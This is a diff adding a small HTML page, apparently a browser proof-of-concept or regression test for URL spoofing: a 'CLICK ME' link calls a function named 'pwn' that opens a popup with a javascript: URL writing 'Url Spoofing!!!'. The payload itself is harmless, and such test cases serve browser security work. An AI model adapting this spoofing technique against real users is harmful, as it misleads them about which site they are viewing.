@@ -1,0 +1,10 @@
+<script>
+function pwn() {
+    w = window.open(
+            "javascript:document.write('<h1>Url Spoofing!!!</h1>');",
+            "new",
+            "width=500 height=500"
+        );
+}
+</script>
+<h1><a href="#" onclick="pwn()">CLICK ME</a></h1>
